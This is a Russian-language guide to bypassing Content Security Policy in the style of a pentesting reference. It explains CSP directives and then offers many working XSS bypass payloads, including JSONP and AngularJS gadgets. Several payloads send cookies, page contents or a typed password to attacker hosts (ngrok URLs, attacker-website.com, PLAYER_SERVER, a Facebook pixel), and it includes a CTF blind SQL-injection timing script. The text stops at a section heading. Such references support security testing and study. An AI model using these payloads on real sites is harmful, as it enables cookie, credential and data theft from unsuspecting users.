**Обход политики безопасности контента (Content Security Policy - CSP)**

**Что такое CSP**

Политика безопасности контента (CSP) — это технология браузера, направленная в первую очередь на защиту от таких атак, как межсайтовый скриптинг (XSS). Она работает путем определения и детализации путей и источников, из которых браузер может безопасно загружать ресурсы. Эти ресурсы охватывают ряд элементов, таких как изображения, фреймы и JavaScript. Например, политика может разрешать загрузку и выполнение ресурсов с того же домена (self), включая встроенные ресурсы и выполнение строкового кода через такие функции, как eval, setTimeout или setInterval.

Реализация CSP осуществляется через заголовки ответа или путем включения элементов meta в HTML-страницу. Следуя этой политике, браузеры активно применяют эти условия и немедленно блокируют любые обнаруженные нарушения.

*   **Реализация через заголовок ответа:**
    ```
    Content-Security-policy: default-src 'self'; img-src 'self' allowed-website.com; style-src 'self';
    ```

*   **Реализация через meta-тег:**
    ```html
    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; img-src https://*; child-src 'none';">
    ```

**Заголовки (Headers)**

CSP может применяться или отслеживаться с использованием следующих заголовков:

*   **Content-Security-Policy:** Применяет CSP; браузер блокирует любые нарушения.
*   **Content-Security-Policy-Report-Only:** Используется для мониторинга; сообщает о нарушениях, не блокируя их. Идеально подходит для тестирования в средах, близких к production.

**Определение ресурсов (Defining Resources)**

CSP ограничивает источники для загрузки как активного, так и пассивного контента, контролируя такие аспекты, как выполнение встроенного JavaScript и использование `eval()`. Пример политики:

```
default-src 'none';
img-src 'self';
script-src 'self' https://code.jquery.com;
style-src 'self';
report-uri /cspreport
font-src 'self' https://addons.cdn.mozilla.net;
frame-src 'self' https://ic.paypal.com https://paypal.com;
media-src https://videos.cdn.mozilla.net;
object-src 'none';
```

**Директивы (Directives)**

*   **script-src:** Разрешает определенные источники для JavaScript, включая URL, встроенные скрипты и скрипты, запускаемые обработчиками событий или таблицами стилей XSLT.
*   **default-src:** Устанавливает политику по умолчанию для получения ресурсов, когда отсутствуют определенные директивы выборки.
*   **child-src:** Определяет разрешенные ресурсы для веб-воркеров и встроенного содержимого фреймов.
*   **connect-src:** Ограничивает URL, которые могут быть загружены с использованием таких интерфейсов, как fetch, WebSocket, XMLHttpRequest.
*   **frame-src:** Ограничивает URL для фреймов.
*   **frame-ancestors:** Определяет, какие источники могут встраивать текущую страницу, применяется к элементам `<frame>`, `<iframe>`, `<object>`, `<embed>` и `<applet>`.
*   **img-src:** Определяет разрешенные источники для изображений.
*   **font-src:** Определяет допустимые источники для шрифтов, загружаемых с помощью `@font-face`.
*   **manifest-src:** Определяет разрешенные источники файлов манифеста приложения.
*   **media-src:** Определяет разрешенные источники для загрузки медиа-объектов.
*   **object-src:** Определяет разрешенные источники для элементов `<object>`, `<embed>` и `<applet>`.
*   **base-uri:** Определяет разрешенные URL для загрузки с помощью элементов `<base>`.
*   **form-action:** Указывает допустимые конечные точки для отправки форм.
*   **plugin-types:** Ограничивает MIME-типы, которые может вызывать страница.
*   **upgrade-insecure-requests:** Указывает браузерам переписывать HTTP URL на HTTPS.
*   **sandbox:** Применяет ограничения, аналогичные атрибуту sandbox элемента `<iframe>`.
*   **report-to:** Указывает группу, в которую будет отправлен отчет в случае нарушения политики.
*   **worker-src:** Определяет допустимые источники для скриптов Worker, SharedWorker или ServiceWorker.
*   **prefetch-src:** Определяет допустимые источники для ресурсов, которые будут загружены или предварительно загружены.
*   **navigate-to:** Ограничивает URL, на которые документ может перейти любыми средствами (a, form, window.location, window.open и т.д.).

**Источники (Sources)**

*   **`*`:** Разрешает все URL, кроме схем `data:`, `blob:`, `filesystem:`.
*   **`'self'`:** Разрешает загрузку с того же домена.
*   **`'data'`:** Разрешает загрузку ресурсов через схему `data:` (например, изображения в кодировке Base64).
*   **`'none'`:** Блокирует загрузку из любого источника.
*   **`'unsafe-eval'`:** Разрешает использование `eval()` и подобных методов, не рекомендуется по соображениям безопасности.
*   **`'unsafe-hashes'`:** Включает определенные встроенные обработчики событий.
*   **`'unsafe-inline'`:** Разрешает использование встроенных ресурсов, таких как встроенные `<script>` или `<style>`, не рекомендуется по соображениям безопасности.
*   **`'nonce'`:** Белый список для определенных встроенных скриптов с использованием криптографического одноразового номера (nonce).
    *   Если у вас есть ограниченное выполнение JS, можно получить использованный nonce на странице с помощью `doc.defaultView.top.document.querySelector("[nonce]")` и затем повторно использовать его для загрузки вредоносного скрипта (если используется `strict-dynamic`, любой разрешенный источник может загружать новые источники, так что это не обязательно), как в примере с загрузкой скрипта с повторным использованием nonce.
*   **`'sha256-<hash>'`:** Добавляет в белый список скрипты с определенным хешем sha256.
*   **`'strict-dynamic'`:** Разрешает загрузку скриптов из любого источника, если они были добавлены в белый список с помощью nonce или хеша.
*   **`'host'`:** Определяет конкретный хост, например `example.com`.
*   **`https:`:** Ограничивает URL теми, которые используют HTTPS.
*   **`blob:`:** Разрешает загрузку ресурсов из Blob URL (например, Blob URL, созданных через JavaScript).
*   **`filesystem:`:** Разрешает загрузку ресурсов из файловой системы.
*   **`'report-sample'`:** Включает образец нарушающего кода в отчет о нарушении (полезно для отладки).
*   **`'strict-origin'`:** Похоже на 'self', но гарантирует, что уровень безопасности протокола источников соответствует документу (только безопасные источники могут загружать ресурсы из безопасных источников).
*   **`'strict-origin-when-cross-origin'`:** Отправляет полные URL при выполнении запросов к тому же источнику, но отправляет только источник, когда запрос является междоменным.
*   **`'unsafe-allow-redirects'`:** Разрешает загрузку ресурсов, которые будут немедленно перенаправлены на другой ресурс. Не рекомендуется, так как ослабляет безопасность.

**Небезопасные правила CSP**

**'unsafe-inline'**

Политика: `Content-Security-Policy: script-src https://google.com 'unsafe-inline';`

Рабочая полезная нагрузка: `"/><script>alert(1);</script>`

**self + 'unsafe-inline' через Iframes**

{{#ref}} csp-bypass-self-+-unsafe-inline-with-iframes.md {{#endref}}

**'unsafe-eval'**

**Внимание:** Это не работает, для получения дополнительной информации проверьте это.

Политика: `Content-Security-Policy: script-src https://google.com 'unsafe-eval';`

Рабочая полезная нагрузка:

```html
<script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
```

**strict-dynamic**

Если вы каким-то образом можете заставить разрешенный JS-код создать новый тег script в DOM с вашим JS-кодом, то, поскольку разрешенный скрипт создает его, новый тег script будет разрешен к выполнению.

**Подстановочный знак (*)**

Политика: `Content-Security-Policy: script-src 'self' https://google.com https: data *;`

Рабочие полезные нагрузки:

```html
"/>'><script src=https://attacker-website.com/evil.js></script>
"/>'><script src=data:text/javascript,alert(1337)></script>
```

**Отсутствие object-src и default-src**

**[!] Осторожно:** Похоже, это больше не работает.

Политика: `Content-Security-Policy: script-src 'self' ;`

Рабочие полезные нагрузки:

```html
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
">'><object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
<param name="AllowScriptAccess" value="always"></object>
```

**Загрузка файла (File Upload) + 'self'**

Политика: `Content-Security-Policy: script-src 'self';  object-src 'none' ;`

Если вы можете загрузить JS-файл, вы можете обойти эту CSP.

Рабочая полезная нагрузка:

```html
"/>'><script src="/uploads/picture.png.js"></script>
```

Однако, весьма вероятно, что сервер проверяет загруженный файл и позволит вам загружать только определенные типы файлов.

Более того, даже если вы сможете загрузить JS-код внутри файла, используя расширение, принимаемое сервером (например, `script.png`), этого может быть недостаточно, потому что некоторые серверы, такие как Apache, выбирают MIME-тип файла на основе расширения, и браузеры, такие как Chrome, откажутся выполнять код JavaScript внутри того, что должно быть изображением. "К счастью", случаются ошибки. Например, из опыта CTF я узнал, что Apache не знает расширения `.wave`, поэтому не отдает его с MIME-типом `audio/*`.

Исходя из этого, если вы найдете XSS и загрузку файла и сможете найти неправильно интерпретируемое расширение, вы можете попытаться загрузить файл с этим расширением и содержимым скрипта. Или, если сервер проверяет правильный формат загружаемого файла, создайте полиглот (некоторые примеры полиглотов здесь).

**form-action**

Если нет возможности внедрить JS, вы все равно можете попытаться выкрасть, например, учетные данные, внедряя действие формы (и, возможно, ожидая, что менеджеры паролей автоматически заполнят пароли). Пример можно найти в этом отчете. Также обратите внимание, что `default-src` не охватывает действия форм.

**Сторонние конечные точки (Third Party Endpoints) + ('unsafe-eval')**

**Предупреждение:** Для некоторых из следующих полезных нагрузок `unsafe-eval` даже не требуется.

Политика: `Content-Security-Policy: script-src https://cdnjs.cloudflare.com 'unsafe-eval';`

Загрузите уязвимую версию angular и выполните произвольный JS:

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.4.6/angular.js"></script>
<div ng-app> {{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1);//');}} </div>

"><script src="https://cdnjs.cloudflare.com/angular.min.js"></script> <div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>

"><script src="https://cdnjs.cloudflare.com/angularjs/1.1.3/angular.min.js"> </script>
<div ng-app ng-csp id=p ng-click=$event.view.alert(1337)>
```

С некоторыми обходами из: https://blog.huli.tw/2022/08/29/en/intigriti-0822-xss-author-writeup/

```html
<script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js></script>
<iframe/ng-app/ng-csp/srcdoc="
  <script/src=https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.0/angular.js>
  </script>
  <img/ng-app/ng-csp/src/ng-o{{}}n-error=$event.target.ownerDocument.defaultView.alert($event.target.ownerDocument.domain)>"
>
```

Полезные нагрузки с использованием Angular и библиотеки с функциями, возвращающими объект window (проверьте этот пост):

**Подсказка:** Пост показывает, что вы можете загрузить все библиотеки с cdn.cloudflare.com (или любого другого разрешенного репозитория JS-библиотек), выполнить все добавленные функции из каждой библиотеки и проверить, какие функции из каких библиотек возвращают объект window.

```html
<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.js" /></script>
<div ng-app ng-csp>
 {{$on.curry.call().alert(1)}}
 {{[].empty.call().alert([].empty.call().document.domain)}}
 {{ x = $on.curry.call().eval("fetch('http://localhost/index.php').then(d => {})") }}
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{$on.curry.call().alert('xss')}}
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/mootools/1.6.0/mootools-core.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js"></script>
<div ng-app ng-csp>
  {{[].erase.call().alert('xss')}}
</div>
```

Angular XSS из имени класса:

```html
<div ng-app>
  <strong class="ng-init:constructor.constructor('alert(1)')()">aaa</strong>
</div>
```

**Злоупотребление JS-кодом Google reCAPTCHA**

Согласно этому решению CTF, вы можете использовать `https://www.google.com/recaptcha/` внутри CSP для выполнения произвольного JS-кода в обход CSP:

```html
<div
  ng-controller="CarouselController as c"
  ng-init="c.init()"
>
&#91[c.element.ownerDocument.defaultView.parent.location="http://google.com?"+c.element.ownerDocument.cookie]]
<div carousel><div slides></div></div>

<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>
```

Больше полезных нагрузок из этого решения:

```html
<script src="https://www.google.com/recaptcha/about/js/main.min.js"></script>

<!-- Trigger alert -->
<img src="x" ng-on-error="$event.target.ownerDocument.defaultView.alert(1)" />

<!-- Reuse nonce -->
<img
  src="x"
  ng-on-error='
	doc=$event.target.ownerDocument;
	a=doc.defaultView.top.document.querySelector("[nonce]");
	b=doc.createElement("script");
	b.src="//example.com/evil.js";
	b.nonce=a.nonce; doc.body.appendChild(b)' />
```

**Злоупотребление www.google.com для открытого перенаправления**

Следующий URL перенаправляет на example.com (отсюда):

`https://www.google.com/amp/s/example.com/`

**Злоупотребление *.google.com/script.google.com**

Можно злоупотребить Google Apps Script для получения информации на странице внутри `script.google.com`. Как это сделано в этом отчете.

**Сторонние конечные точки + JSONP**

Политика: `Content-Security-Policy: script-src 'self' https://www.google.com https://www.youtube.com; object-src 'none';`

Сценарии, подобные этому, где `script-src` установлен на `self` и конкретный домен из белого списка, могут быть обойдены с помощью JSONP. Конечные точки JSONP позволяют использовать небезопасные методы обратного вызова, которые позволяют злоумышленнику выполнить XSS. Рабочие полезные нагрузки:

```html
"><script src="https://www.google.com/complete/search?client=chrome&q=hello&callback=alert#1"></script>
"><script src="/api/jsonp?callback=(function(){window.top.location.href=`http://f6a81b32f7f7.ngrok.io/cooookie`%2bdocument.cookie;})();//"></script>

https://www.youtube.com/oembed?callback=alert;
<script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&format=json&callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"></script>

<script type="text/javascript" crossorigin="anonymous" src="https://accounts.google.com/o/oauth2/revoke?callback=eval(atob(...))"></script>
```

**JSONBee** содержит готовые к использованию конечные точки JSONP для обхода CSP различных веб-сайтов.

Та же уязвимость возникнет, если доверенная конечная точка содержит открытое перенаправление (Open Redirect), потому что если начальная конечная точка доверена, перенаправления также доверены.

**Злоупотребление сторонними сервисами (Third Party Abuses)**

Как описано в следующем посте, существует множество сторонних доменов, которые могут быть где-то разрешены в CSP, и ими можно злоупотребить либо для кражи данных, либо для выполнения кода JavaScript. Некоторые из этих сторонних сервисов:

| Компания | Разрешенный домен | Возможности |
| :--- | :--- | :--- |
| Facebook | www.facebook.com, *.facebook.com | Кража данных (Exfil) |
| Hotjar | *.hotjar.com, ask.hotjar.io | Кража данных (Exfil) |
| Jsdelivr | *.jsdelivr.com, cdn.jsdelivr.net | Выполнение кода (Exec) |
| Amazon CloudFront | *.cloudfront.net | Кража данных (Exfil), Выполнение кода (Exec) |
| Amazon AWS | *.amazonaws.com | Кража данных (Exfil), Выполнение кода (Exec) |
| Azure Websites | *.azurewebsites.net, *.azurestaticapps.net | Кража данных (Exfil), Выполнение кода (Exec) |
| Salesforce Heroku | *.herokuapp.com | Кража данных (Exfil), Выполнение кода (Exec) |
| Google Firebase | *.firebaseapp.com | Кража данных (Exfil), Выполнение кода (Exec) |

Если вы найдете какой-либо из разрешенных доменов в CSP вашей цели, вполне вероятно, что вы сможете обойти CSP, зарегистрировавшись в стороннем сервисе и либо отправляя данные в этот сервис, либо выполняя код.

Например, если вы найдете следующий CSP:

`Content-Security-Policy​: default-src 'self' www.facebook.com;​`

или

`Content-Security-Policy​: connect-src www.facebook.com;​`

Вы должны иметь возможность кражи данных, аналогично тому, как это всегда делалось с Google Analytics/Google Tag Manager. В этом случае вы выполняете следующие общие шаги:

1.  Создайте учетную запись разработчика Facebook здесь.
2.  Создайте новое приложение "Facebook Login" и выберите "Website".
3.  Перейдите в "Settings -> Basic" и получите свой "App ID".
4.  На целевом сайте, откуда вы хотите украсть данные, вы можете отправлять данные, напрямую используя гаджет Facebook SDK "fbq" через "customEvent" и полезную нагрузку данных.
5.  Перейдите в "Event Manager" вашего приложения (менеджер событий может находиться по URL, похожему на этот: `https://www.facebook.com/events_manager2/list/pixel/[app-id]/test_events`).
6.  Выберите вкладку "Test Events", чтобы увидеть события, отправляемые "вашим" веб-сайтом.

Затем на стороне жертвы вы выполняете следующий код для инициализации пикселя отслеживания Facebook, чтобы он указывал на `app-id` учетной записи разработчика Facebook злоумышленника, и отправляете пользовательское событие:

```javascript
fbq('init', '1279785999289471');​ // это число должно быть App ID учетной записи Meta/Facebook злоумышленника
fbq('trackCustom', 'My-Custom-Event', {​
    data: "Утекший пароль пользователя: '"+document.getElementById('user-password').innerText+"'"​
});
```

Что касается остальных семи сторонних доменов, указанных в предыдущей таблице, существует множество других способов злоупотребить ими. Обратитесь к предыдущему сообщению в блоге для получения дополнительных объяснений о других злоупотреблениях сторонними сервисами.

**Обход через RPO (Relative Path Overwrite - перезапись относительного пути)**

В дополнение к вышеупомянутому перенаправлению для обхода ограничений пути, существует другая техника, называемая перезапись относительного пути (RPO), которая может быть использована на некоторых серверах.

Например, если CSP разрешает путь `https://example.com/scripts/react/`, его можно обойти следующим образом:

```html
<script src="https://example.com/scripts/react/..%2fangular%2fangular.js"></script>
```

В конечном итоге браузер загрузит `https://example.com/scripts/angular/angular.js`.

Это работает, потому что для браузера вы загружаете файл с именем `..%2fangular%2fangular.js`, расположенный по адресу `https://example.com/scripts/react/`, что соответствует CSP.

Затем они (браузеры) декодируют его, фактически запрашивая `https://example.com/scripts/react/../angular/angular.js`, что эквивалентно `https://example.com/scripts/angular/angular.js`.

Используя это несоответствие в интерпретации URL между браузером и сервером, можно обойти правила пути.

Решение состоит в том, чтобы не рассматривать `%2f` как `/` на стороне сервера, обеспечивая согласованную интерпретацию между браузером и сервером, чтобы избежать этой проблемы.

Онлайн-пример: https://jsbin.com/werevijewa/edit?html,output

**Выполнение JS в Iframe**

{{#ref}} ../xss-cross-site-scripting/iframes-in-xss-and-csp.md {{#endref}}

**Отсутствие base-uri**

Если директива `base-uri` отсутствует, вы можете злоупотребить ею для выполнения инъекции "болтающейся" разметки (dangling markup injection).

Более того, если страница загружает скрипт, используя относительный путь (например, `<script src="/js/app.js">`) с использованием Nonce, вы можете злоупотребить тегом `base`, чтобы заставить его загрузить скрипт с вашего собственного сервера, добившись XSS.

Если уязвимая страница загружена через `https`, используйте URL с `https` в `base`.

```html
<base href="https://www.attacker.com/" />
```

**События AngularJS**

Определенная политика, известная как Content Security Policy (CSP), может ограничивать события JavaScript. Тем не менее, AngularJS предлагает пользовательские события в качестве альтернативы. Внутри события AngularJS предоставляет уникальный объект `$event`, ссылающийся на собственный объект события браузера. Этим объектом `$event` можно манипулировать для обхода CSP. Примечательно, что в Chrome объект `$event`/event имеет атрибут `path`, содержащий массив объектов, участвующих в цепочке выполнения события, причем объект window всегда находится в конце. Эта структура имеет решающее значение для методов обхода песочницы.

Направив этот массив в фильтр `orderBy`, можно перебрать его, используя конечный элемент (объект window) для запуска глобальной функции, такой как `alert()`. Приведенный ниже фрагмент кода иллюстрирует этот процесс:

```html
<input%20id=x%20ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x
```

Этот фрагмент демонстрирует использование директивы `ng-focus` для запуска события, используя `$event.path|orderBy` для манипулирования массивом пути и используя объект window для выполнения функции `alert()`, тем самым раскрывая `document.cookie`.

Найдите другие обходы Angular в https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

**AngularJS и домен из белого списка**

Политика: `Content-Security-Policy: script-src 'self' ajax.googleapis.com; object-src 'none' ;report-uri /Report-parsing-url;`

Политика CSP, которая добавляет домены в белый список для загрузки скриптов в приложении Angular JS, может быть обойдена с помощью вызова функций обратного вызова и некоторых уязвимых классов. Дополнительную информацию об этой технике можно найти в подробном руководстве, доступном в этом репозитории git.

Рабочие полезные нагрузки:

```html
<script src=//ajax.googleapis.com/ajax/services/feed/find?v=1.0%26callback=alert%26context=1337></script>
ng-app"ng-csp ng-click=$event.view.alert(1337)><script src=//ajax.googleapis.com/ajax/libs/angularjs/1.0.8/angular.js></script>

<!-- больше не работает -->
<script src="https://www.googleapis.com/customsearch/v1?callback=alert(1)">
```

Другие конечные точки для выполнения произвольного JSONP можно найти здесь (некоторые из них были удалены или исправлены).

**Обход через перенаправление (Redirection)**

Что происходит, когда CSP сталкивается с перенаправлением на стороне сервера? Если перенаправление ведет на другой источник, который не разрешен, оно все равно не сработает.

Однако, согласно описанию в спецификации CSP 4.2.2.3. Paths and Redirects, если перенаправление ведет на другой путь, оно может обойти исходные ограничения.

Вот пример:

```html
<!DOCTYPE html>
<html>
  <head>
    <meta
      http-equiv="Content-Security-Policy"
      content="script-src http://localhost:5555 https://www.google.com/a/b/c/d" />
  </head>
  <body>
    <div id="userContent">
      <script src="https://https://www.google.com/test"></script>
      <script src="https://https://www.google.com/a/test"></script>
      <script src="http://localhost:5555/301"></script>
    </div>
  </body>
</html>
```

Если CSP установлена на `https://www.google.com/a/b/c/d`, поскольку путь учитывается, оба скрипта `/test` и `/a/test` будут заблокированы CSP.

Однако последний скрипт `http://localhost:5555/301` будет перенаправлен на стороне сервера на `https://www.google.com/complete/search?client=chrome&q=123&jsonp=alert(1)//`. Поскольку это перенаправление, путь не учитывается, и скрипт может быть загружен, таким образом обходя ограничение пути.

С помощью этого перенаправления, даже если путь указан полностью, он все равно будет обойден.

Поэтому лучшее решение — убедиться, что на веб-сайте нет уязвимостей открытого перенаправления и что в правилах CSP нет доменов, которыми можно злоупотребить.

**Обход CSP с помощью "болтающейся" разметки (dangling markup)**

Прочитайте, как это сделать, здесь.

**'unsafe-inline'; img-src *; через XSS**

Политика: `default-src 'self' 'unsafe-inline'; img-src *;`

'unsafe-inline' означает, что вы можете выполнять любой скрипт внутри кода (XSS может выполнять код), а `img-src *` означает, что вы можете использовать на веб-странице любое изображение из любого ресурса.

Вы можете обойти эту CSP, отправляя данные через изображения (в этом случае XSS злоупотребляет CSRF, где страница, доступная боту, содержит SQL-инъекцию, и извлекает флаг через изображение):

```html
<script>
  fetch('http://x-oracle-v0.nn9ed.ka0labs.org/admin/search/x%27%20union%20select%20flag%20from%20challenge%23').then(_=>_.text()).then(_=>new
  Image().src='http://PLAYER_SERVER/?'+_)
</script>
```

Из: https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle

Вы также можете злоупотребить этой конфигурацией для загрузки кода JavaScript, вставленного внутрь изображения. Если, например, страница позволяет загружать изображения из Twitter. Вы можете создать специальное изображение, загрузить его в Twitter и использовать `unsafe-inline` для выполнения JS-кода (как обычный XSS), который загрузит изображение, извлечет из него JS и выполнит его: https://www.secjuice.com/hiding-javascript-in-png-csp-bypass/

**С помощью сервис-воркеров (Service Workers)**

Функция `importScripts` сервис-воркеров не ограничена CSP:

{{#ref}} ../xss-cross-site-scripting/abusing-service-workers.md {{#endref}}

**Внедрение политики (Policy Injection)**

Исследование: https://portswigger.net/research/bypassing-csp-with-policy-injection

**Chrome**

Если параметр, отправленный вами, вставляется в объявление политики, то вы можете изменить политику таким образом, чтобы сделать ее бесполезной. Вы можете разрешить скрипт `'unsafe-inline'` с помощью любого из этих обходных путей:

```
script-src-elem *; script-src-attr *
script-src-elem 'unsafe-inline'; script-src-attr 'unsafe-inline'
```

Поскольку эта директива перезапишет существующие директивы `script-src`.

Пример можно найти здесь: http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22http://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E

**Edge**

В Edge это намного проще. Если вы можете добавить в CSP просто `;_`, Edge отбросит всю политику.

Пример: http://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=;_&y=%3Cscript%3Ealert(1)%3C/script%3E

**img-src *; через XSS (iframe) - Time attack**

Обратите внимание на отсутствие директивы `'unsafe-inline'`.
На этот раз вы можете заставить жертву загрузить страницу под вашим контролем через XSS с помощью `<iframe`. На этот раз вы заставите жертву получить доступ к странице, с которой вы хотите извлечь информацию (CSRF). Вы не можете получить доступ к содержимому страницы, но если вы каким-то образом можете контролировать время, необходимое для загрузки страницы, вы можете извлечь нужную вам информацию.

В этот раз извлекается флаг. Всякий раз, когда символ правильно угадывается через SQL-инъекцию, время ответа увеличивается из-за функции `sleep`. Затем вы сможете извлечь флаг:

```html
<!--код из https://github.com/ka0labs/ctf-writeups/tree/master/2019/nn9ed/x-oracle -->
<iframe name="f" id="g"></iframe> // Бот загрузит URL с полезной нагрузкой
<script>
  let host = "http://x-oracle-v1.nn9ed.ka0labs.org"
  function gen(x) {
    x = escape(x.replace(/_/g, "\\_"))
    return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag%20like%20'${x}%25'and%201=sleep(0.1)%23`
  }

  function gen2(x) {
    x = escape(x)
    return `${host}/admin/search/x'union%20select(1)from%20challenge%20where%20flag='${x}'and%201=sleep(0.1)%23`
  }

  async function query(word, end = false) {
    let h = performance.now()
    f.location = end ? gen2(word) : gen(word)
    await new Promise((r) => {
      g.onload = r
    })
    let diff = performance.now() - h
    return diff > 300
  }

  let alphabet = "_abcdefghijklmnopqrstuvwxyz0123456789".split("")
  let postfix = "}"

  async function run() {
    let prefix = "nn9ed{"
    while (true) {
      let i = 0
      for (i; i < alphabet.length; i++) {
        let c = alphabet[i]
        let t = await query(prefix + c) // Проверяет, какие символы возвращают TRUE или FALSE
        console.log(prefix, c, t)
        if (t) {
          console.log("НАЙДЕНО!")
          prefix += c
          break
        }
      }
      if (i == alphabet.length) {
        console.log("отсутствующие символы")
        break
      }
      let t = await query(prefix + "}", true)
      if (t) {
        prefix += "}"
        break
      }
    }
    new Image().src = "http://PLAYER_SERVER/?" + prefix //Отправка флага
    console.log(prefix)
  }

  run()
</script>
```

**Через букмарклеты (Bookmarklets)**

Эта атака включает некоторую социальную инженерию, где злоумышленник убеждает пользователя перетащить ссылку на панель закладок браузера. Этот букмарклет будет содержать вредоносный код JavaScript, который при перетаскивании или нажатии будет выполняться в контексте текущего окна, обходя CSP и позволяя украсть конфиденциальную информацию, такую как куки или токены.

Для получения дополнительной информации ознакомьтесь с оригинальным отчетом здесь.

**Обход CSP путем ограничения CSP**

В этом решении CTF CSP обходится путем внедрения внутри разрешенного iframe более строгой CSP, которая запрещает загрузку определенного JS-файла, что затем, через загрязнение прототипа или захват DOM, позволяет использовать другой скрипт для загрузки произвольного скрипта.

Вы можете ограничить CSP Iframe с помощью атрибута `csp`:

```html
<iframe
  src="https://biohazard-web.2023.ctfcompetition.com/view/[bio_id]"
  csp="script-src https://biohazard-web.2023.ctfcompetition.com/static/closure-library/ https://biohazard-web.2023.ctfcompetition.com/static/sanitizer.js https://biohazard-web.2023.ctfcompetition.com/static/main.js 'unsafe-inline' 'unsafe-eval'"></iframe>
```

В этом решении CTF можно было через HTML-инъекцию еще больше ограничить CSP, чтобы отключить скрипт, предотвращающий CSTI, и, следовательно, уязвимость стала эксплуатируемой.

CSP можно сделать более строгой, используя HTML-метатеги, а встроенные скрипты можно отключить, удалив запись, разрешающую их nonce, и включить конкретный встроенный скрипт через sha:

```html
<meta
  http-equiv="Content-Security-Policy"
  content="script-src 'self'
'unsafe-eval' 'strict-dynamic'
'sha256-whKF34SmFOTPK4jfYDy03Ea8zOwJvqmz%2boz%2bCtD7RE4='
'sha256-Tz/iYFTnNe0de6izIdG%2bo6Xitl18uZfQWapSbxHE6Ic=';" />
```

**Кража JS с помощью Content-Security-Policy-Report-Only**

Если вам удастся заставить сервер ответить заголовком `Content-Security-Policy-Report-Only` со значением, контролируемым вами (возможно, из-за CRLF), вы можете указать ваш сервер, и если вы обернете JS-контент, который хотите украсть, в теги `<script>`, и, поскольку `unsafe-inline` скорее всего не разрешен CSP, это вызовет ошибку CSP, и часть скрипта (содержащая конфиденциальную информацию) будет отправлена на сервер из `Content-Security-Policy-Report-Only`.

Пример см. в этом решении CTF.

**CVE-2020-6519**

```javascript
document.querySelector("DIV").innerHTML =
  '<iframe src=\'javascript:var s = document.createElement("script");s.src = "https://pastebin.com/raw/dw5cWGK6";document.body.appendChild(s);\'></iframe>'
```

**Утечка информации с помощью CSP и Iframe**

1.  Создается iframe, который указывает на URL (назовем его `https://example.redirect.com`), разрешенный CSP.
2.  Затем этот URL перенаправляет на секретный URL (например, `https://usersecret.example2.com`), который не разрешен CSP.
3.  Прослушивая событие `securitypolicyviolation`, можно перехватить свойство `blockedURI`. Это свойство раскрывает домен заблокированного URI, раскрывая секретный домен, на который перенаправил исходный URL.

Интересно отметить, что браузеры, такие как Chrome и Firefox, по-разному обрабатывают iframe в отношении CSP, что может привести к потенциальной утечке конфиденциальной информации из-за неопределенного поведения.

Другая техника включает использование самой CSP для определения секретного поддомена. Этот метод основан на алгоритме двоичного поиска и настройке CSP на включение определенных доменов, которые намеренно блокируются. Например, если секретный поддомен состоит из неизвестных символов, вы можете итеративно тестировать разные поддомены, изменяя директиву CSP для блокировки или разрешения этих поддоменов. Вот фрагмент, показывающий, как может быть настроена CSP для облегчения этого метода:

```
img-src https://chall.secdriven.dev https://doc-1-3213.secdrivencontent.dev https://doc-2-3213.secdrivencontent.dev ... https://doc-17-3213.secdriven.dev
```

Отслеживая, какие запросы блокируются или разрешаются CSP, можно сузить круг возможных символов в секретном поддомене, в конечном итоге раскрыв полный URL.

Оба метода используют нюансы реализации CSP и поведения в браузерах, демонстрируя, как, казалось бы, безопасные политики могут непреднамеренно раскрывать конфиденциальную информацию.

Трюк отсюда.

**Небезопасные технологии для обхода CSP**

**Ошибки PHP при слишком большом количестве параметров**

Согласно последней технике, прокомментированной в этом видео, отправка слишком большого количества параметров (1001 GET параметр, хотя это также можно сделать с POST параметрами и более чем 20 файлами). Любой определенный `header()` в PHP-коде не будет отправлен из-за ошибки, которую это вызовет.

**Переполнение буфера ответа PHP**

Известно, что PHP буферизует ответ по умолчанию до 4096 байт. Следовательно, если PHP показывает предупреждение, предоставляя достаточно данных внутри предупреждений, ответ будет отправлен до заголовка CSP, в результате чего заголовок будет проигнорирован.

Затем техника заключается в заполнении буфера ответа предупреждениями, чтобы заголовок CSP не был отправлен.

Идея из этого решения.

**Убийство CSP через max_input_vars (заголовки уже отправлены)**

